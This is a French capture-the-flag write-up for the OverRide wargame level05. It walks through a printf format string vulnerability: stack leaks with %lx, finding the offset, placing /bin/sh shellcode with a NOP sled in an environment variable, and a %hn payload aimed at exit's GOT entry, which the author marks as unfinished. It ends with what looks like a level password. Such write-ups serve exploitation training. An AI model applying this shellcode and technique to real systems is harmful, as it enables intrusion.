Comme on peut le voir pas d'appel à system ou "/bin/sh" donc on va peut etre devoir faire un overflow ? Malheuresement ça me semble un peut complexe du a la sécurité du fgtes a 100. Il nous reste le printf pas sécurisé mais rien a cherché dedans j'ai déja fait print "%lx " * 100 mais rien . 


On voit dans le code que le on a une allocation memoire de 100 sur notre variable buffer mais qui est proteger par fgets a hauteur de l'allocation memoire de notre buffer. On ne peut donc pas overflow. Or on observe une faille dans printf car pas de securite sur la taille du buffer ou d'affichage :

printf(buffer); au lieu de printf("%s",buffer);

Donc on peut affecter l'affichage et autre. Exemple :

python -c 'print "A" * 20' | ./level05
aaaaaaaaaaaaaaaaaaaa

Ok maintenant on essaie d'afficher la memoire :

python -c 'print "%lx " * 20' | ./level05 
64 f7fcfac0 f7ec3add ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25


Maintenant on essayer les 2 :

level05@OverRide:~$ python -c 'print "AAAA" + "%lx " * 20' | ./level05 
aaaa64 f7fcfac0 f7ec3add ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 61616161 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25

On observe 61616161 qui est notre AAAA notre offset est donc au 10 emplacement on va pouvoir agir potentiellement par ici



Etant donner que l'on va essayer de rentrer un shellcode on va le mettre dans une variable d'environnement pour ne pas depasser les 100 caracteres imposer par fgets.

On va rediriger le ret de exit pour mettre notre shellcode dedans.

On va essayer d'ecrire dans la memoire avec %n l'argument de printf et de profiter du format string vunerability


```bash
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

🔹 \x90 est l’instruction NOP (No Operation) → le NOP sled, pour sécuriser l’atterrissage dans le shellcode (si on saute un peu avant).

Le binaire lit 100 octets max via fgets() -> Donc tu ne peux pas injecter un gros shellcode dans l'entrée standard

Les variables d’environnement sont accessibles depuis le programme en mémoire -> Donc tu mets ton shellcode dans une variable export pour qu’il soit présent en mémoire à l’exécution

Recherche de notre variable d'env dans la memoire :

```gdb
x/200s environ
0xffffd866:"SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
```

Et plus précisément : l'adresse exacte de ton shellcode = 0xffffd866 + len("SHELLCODE=")

S H E L L C O D E =  → 10 caractères

Adresse du shellcode = 0xffffd866 + 10 = 0xffffd870

Mainteant l'adresse got de exit :

Voila l'adresse de exit :
0x80497e0

L'adresse du notre shellcode dans l'env charger :

(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt
0xf7e5eb70  exit
0xf7e5eba0  on_exit
0xf7e5edb0  __cxa_atexit
0xf7e5ef50  quick_exit
0xf7e5ef80  __cxa_at_quick_exit
0xf7ee45c4  _exit
0xf7f27ec0  pthread_exit
0xf7f2d4f0  __cyg_profile_func_exit
0xf7f4bc30  svc_exit
0xf7f55d80  atexit
(gdb) x/i 0x08048370
   0x8048370 <exit@plt>:	jmp    *0x80497e0

C'est cette adresse : 0x80497e0



python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55400x%10$hn" + "%10127x%11$hn"' | ./level05
----> Pas bon a terminer

------
 
  ...
  h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq


